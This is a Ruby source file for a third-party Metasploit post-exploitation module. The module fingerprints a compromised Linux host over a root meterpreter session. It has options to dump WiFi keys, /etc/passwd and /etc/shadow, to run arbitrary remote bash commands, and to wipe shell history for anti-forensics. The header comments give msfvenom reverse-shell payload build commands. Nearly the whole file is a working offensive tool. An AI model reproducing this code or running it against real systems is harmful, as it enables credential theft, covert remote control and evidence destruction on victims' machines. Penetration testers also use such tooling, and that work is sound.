##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# [ linux_hostrecon.rb - target fingerprints post-module ]
# Author: pedr0 Ubuntu [r00t-3xp10it]
# tested on: linux Kali 2.0
# P.O.C https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC[ERB]/metasploit-API/writing_a_linux_post_module_from_scratch.md
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This module gathers target system information (linux distros), dump remote credentials
# display outputs and stores it into a logfile in msf4/loot folder. this module also allows
# users to execute a single_command in bash + read/store outputs (advanced options).
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on => set SESSION 3
# Store dumped data to msf4/loot folder?   => set STORE_LOOT true
# Agressive system fingerprints scan?      => set AGRESSIVE_DUMP true
# Dump remote credentials from target?     => set CREDENTIALS_DUMP true
# The bash command to execute remotly      => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
# Delete remote shell history commands?    => set DEL_SHELL_HISTORY true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/gather/linux_hostrecon.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gather/linux_hostrecon.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/gather
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > use post/linux/gather/linux_hostrecon
# msf post(linux_hostrecon) > info
# msf post(linux_hostrecon) > show options
# msf post(linux_hostrecon) > show advanced options
# msf post(linux_hostrecon) > set [option(s)]
# msf post(linux_hostrecon) > exploit
#
#
# [ BUILD PAYLOAD ]
# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f raw -o agent.py
# OR: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f c -o template.c
# gcc -fno-stack-protector -z execstack template.c -o agent
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -q -x 'reload_all'
##





#
# Metasploit Module librarys to load ..
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# The 'def initialize()' funtion ..
# Building Metasploit/Armitage info GUI/CLI description
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'linux hostrecon post-module (fingerprints)',
                        'Description'   => %q{
                                        This module gathers target system information (linux distros) dump remote credentials, display outputs and stores it into a logfile in msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
                                ],
 
                        'Version'        => '$Revision: 1.3',
                        'DisclosureDate' => 'set 27 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',  # root privileges required?
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts linux targets
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/RzP3DM' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://rapid7.github.io/metasploit-framework/api/' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
                                OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
                                OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target?', false]),
                                OptBool.new('DEL_SHELL_HISTORY', [false, 'Delete remote shell history commands?', false]),
                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotelly'])
                        ], self.class)
 
        end



#
# The 'def run()' funtion ..
# Running sellected modules against session target.
#
def run

  session = client
  #
  # draw module banner ..
  #
  print_line("+---------------------------------+")
  print_line("|   LINUX HOSTRECON POST-MODULE   |")
  print_line("|      Author : r00t-3xp10it      |")
  print_line("+---------------------------------+")



    #
    # Local variable declarations (msf API calls)
    #
    host_ip = client.session_host
    payload_path = client.fs.dir.pwd
    sys_info = session.sys.config.sysinfo
    session_pid = client.sys.process.getpid
    #
    # check for proper target operative system (Linux)
    #
    unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
      print_error("[ABORT]: This module only works againts Linux systems ..")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    target_uid = client.sys.config.getuid
    unless target_uid =~ /uid=0/ || target_uid =~ /root/
      print_error("[ABORT]: root access is required in target system ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_good("Running module against: #{sys_info['Computer']}")
      Rex::sleep(0.5)
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end



      #
      # Dump system information from target (fingerprints)
      #
      data_dump=''
      print_status("Executing list of commands remotelly ..")
      Rex::sleep(0.5)
      #
      # bash commands to be executed remotelly ..
      #
      date_out = cmd_exec("date")
      file_sys = cmd_exec("df -H")
      mont_uuid = cmd_exec("lsblk -f")
      storage_mont = cmd_exec("lsblk -m")
      distro_uname = cmd_exec("uname -a")
      net_stat = cmd_exec("netstat -tulpn")
      net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
      gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
      interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
      hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
      hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID' | awk {'print $3'}")
      mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
      mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
      sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
      mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
      model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
      distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
      localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
        print_status("Storing scan results into msf database ..")
        Rex::sleep(0.7)
        #
        # Store data into a local variable (data_dump) ..
        # to be able to write the logfile and display the outputs ..
        #
        data_dump << "\n\n"
        data_dump << "Date/Hour: " + date_out + "\n"
        data_dump << "----------------------------------------\n"
        data_dump << "Running on session  : #{datastore['SESSION']}\n"
        data_dump << "Target Computer     : #{sys_info['Computer']}\n"
        data_dump << "Target session PID  : #{session_pid}\n"
        data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
        data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
        data_dump << "Target Arch (vendor): #{hardware_vendor}\n"
        data_dump << "CPU (Model name)    : #{model_name}\n"
        data_dump << "Target mem free     : #{mem_free}\n"
        data_dump << "Target mem total    : #{mem_total}\n"
        data_dump << "Target mem dirty    : #{mem_dirty}\n"
        data_dump << "System language     : #{sys_lang}\n"
        data_dump << "Target interface    : #{interface}\n"
        data_dump << "Target IP addr      : #{host_ip}\n"
        data_dump << "Target gateway      : #{gateway}\n"
        data_dump << "Target localhost    : #{localhost_ip}\n"
        data_dump << "Payload directory   : #{payload_path}\n"
        data_dump << "Client UID          : #{target_uid}\n"
        data_dump << "Distro description  : #{distro_description}\n"
        data_dump << "Operative System    : #{sys_info['OS']}\n"
        data_dump << "Distro uname        : #{distro_uname}\n"
        data_dump << "\n\n\n"
        data_dump << "FILE SYSTEM :\n"
        data_dump << "-------------\n"
        data_dump << file_sys
        data_dump << "\n\n"
        data_dump << "STORAGE DEVICES INFO:\n"
        data_dump << "---------------------\n"
        data_dump << storage_mont
        data_dump << "\n\n"
        data_dump << mont_uuid
        data_dump << "\n\n"
        data_dump << "TARGET OPEN PORTS :\n"
        data_dump << "-------------------\n"
        data_dump << net_stat
        data_dump << "\n\n"
        data_dump << "ESTABLISHED CONNECTIONS :\n"
        data_dump << "-------------------------\n"
        data_dump << net_established
        data_dump << "\n\n"



        #
        # Run agressive scans againts target ..
        # if sellected previous in advanced options (set AGRESSIVE_DUMP true) ..
        #
        if datastore['AGRESSIVE_DUMP'] == true
          print_status("Running agressive fingerprint modules ..")
          Rex::sleep(0.5)
          #
          # bash commands to be executed remotelly ..
          #
          current_shell = cmd_exec("echo $0")
          list_drivers = cmd_exec("lspci -vv")
          demi_bios = cmd_exec("dmidecode -t bios")
          cron_tasks = cmd_exec("ls -la /etc/cron*")
          root_services = cmd_exec("ps -aux | grep '^root'")
          distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
          distro_history = cmd_exec("ls -la /root/.*_history")
          distro_logs = cmd_exec("find /var/log -type f -perm -4")
          default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
            print_status("Storing scan results into msf database ..")
            Rex::sleep(0.7)
            #
            # store data into a local variable (data_dump) ..
            # to be able to write the logfile and display the outputs ..
            #
            data_dump << "+--------------------------+\n"
            data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
            data_dump << "+--------------------------+\n"
            data_dump << "\n\n"
            data_dump << "CURRENT SHELL :\n"
            data_dump << "---------------\n"
            data_dump << current_shell
            data_dump << "\n\n"
            data_dump << "DEFAULT SHELL :\n"
            data_dump << "---------------\n"
            data_dump << default_shell
            data_dump << "\n\n"
            data_dump << "AVAILABLE SHELLS :\n"
            data_dump << "------------------\n"
            data_dump << distro_shells
            data_dump << "\n\n"
            data_dump << "LIST OF HISTORY FILES :\n"
            data_dump << "-----------------------\n"
            data_dump << distro_history
            data_dump << "\n\n"
            data_dump << "LIST OF LOGFILES FOUND :\n"
            data_dump << "------------------------\n"
            data_dump << distro_logs
            data_dump << "\n\n"
            data_dump << "ROOT SERVICES RUNNING :\n"
            data_dump << "-----------------------\n"
            data_dump << root_services
            data_dump << "\n\n"
            data_dump << "CRONTAB TASKS :\n"
            data_dump << "---------------\n"
            data_dump << cron_tasks
            data_dump << "\n\n"
            data_dump << "SMBIOS DATA (sysfs) :\n"
            data_dump << "---------------------\n"
            data_dump << demi_bios
            data_dump << "\n\n"
            data_dump << "LIST ALL DRIVERS :\n"
            data_dump << "------------------\n"
            data_dump << list_drivers
            data_dump << "\n\n"
        end



        #
        # dump credentials from target ..
        # if sellected previous in advanced options (set CREDENTIALS_DUMP true) ..
        #
        if datastore['CREDENTIALS_DUMP'] == true
          print_status("Dumping remote credentials from target ..")
          Rex::sleep(0.3)
          #
          # bash commands to be executed remotelly ..
          #
          list_sqlite = cmd_exec("ls -a -R /root | grep \"sqlite\"")
          list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
          # Dump target WIFI credentials stored ..
          wpa_out = cmd_exec("grep psk= /etc/NetworkManager/system-connections/*")
          wep_out = cmd_exec("grep wep-key0= /etc/NetworkManager/system-connections/*")
          # dump etc/passwd & etc/shadow files from target
          etc_pass = cmd_exec("cat /etc/passwd")
          etc_shadow = cmd_exec("cat /etc/shadow")
            print_status("Storing scan results into msf database ..")
            Rex::sleep(0.7)
            #
            # store data into a local variable (data_dump) ..
            # to be able to write the logfile and display the outputs ..
            #
            data_dump << "+--------------------------+\n"
            data_dump << "|  REMOTE CREDENTIALS DUMP |\n"
            data_dump << "+--------------------------+\n"
            data_dump << "\n\n"
            data_dump << "WPA CREDENTIALS :\n"
            data_dump << "-----------------\n"
            data_dump << wpa_out
            data_dump << "\n\n"
            data_dump << "WEP CREDENTIALS :\n"
            data_dump << "-----------------\n"
            data_dump << wep_out
            data_dump << "\n\n"
            data_dump << "ETC/PASSWD :\n"
            data_dump << "------------\n"
            data_dump << etc_pass
            data_dump << "\n\n"
            data_dump << "ETC/SHADOW :\n"
            data_dump << "------------\n"
            data_dump << etc_shadow
            data_dump << "\n\n"
            data_dump << "LIST COOKIES :\n"
            data_dump << "--------------\n"
            data_dump << list_cookies
            data_dump << "\n\n"
            data_dump << list_sqlite
            data_dump << "\n\n"
        end



        #
        # Single_command to execute remotelly (user inputs) ..
        # if sellected previous in advanced options (set SINGLE_COMMAND netstat -ano) ..
        #
        exec_bash = datastore['SINGLE_COMMAND']
        # check if single_command option its configurated ..
        if not exec_bash.nil?
          print_status("Executing user input remote bash command ..")
          Rex::sleep(0.7)
          # bash command to be executed remotelly ..
          single_comm = cmd_exec("#{exec_bash}")
            print_status("Storing scan results into msf database ..")
            Rex::sleep(0.7)
            #
            # store data into a local variable (data_dump) ..
            # to be able to write the logfile and display the outputs ..
            #
            data_dump << "+--------------------------------+\n"
            data_dump << "|  COMMAND EXECUTED: #{exec_bash} \n"
            data_dump << "+--------------------------------+\n"
            data_dump << "\n\n"
            data_dump << single_comm
            data_dump << "\n\n"
        end


     #
     # just for showoff ..
     # "print what we are doing before present scans to user"
     #
     if datastore['DEL_SHELL_HISTORY'] == true
       print_status("Deleting remote bash shell history commands list  ..")
       Rex::sleep(0.7)
     end
        data_dump << "----------------------------"



       #
       # All scans finished ..
       # Displaying results on screen (data_dump) ..
       #
       print_good("Remote scans completed, building list ..")
       Rex::sleep(2.3)
       # print the contents of 'data_dump' variable on screen ..
       print_line(data_dump)
       Rex::sleep(0.5)



     #
     # Store 'data_dump' contents into msf loot folder? (local) ..
     # IF sellected previous in advanced options (set STORE_LOOT true) ..
     #
     if datastore['STORE_LOOT'] == true
       print_warning("Fingerprints stored under: ~/.msf4/loot directory")
       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
       Rex::sleep(0.5)
     end
     #
     # linux_hostrecon - Anti-forensic module ..
     # This funtion will delete all entrys from remote bash shell (history command list) ..
     #
     if datastore['DEL_SHELL_HISTORY'] == true
       print_warning("Remote bash shell history command list deleted ..")
       cmd_exec("history -c")
       Rex::sleep(0.5)
     end



   #
   # end of the 'def run()' funtion (exploit code) ..
   #
   end
#
# exit module execution (_EOF) ..
#
end
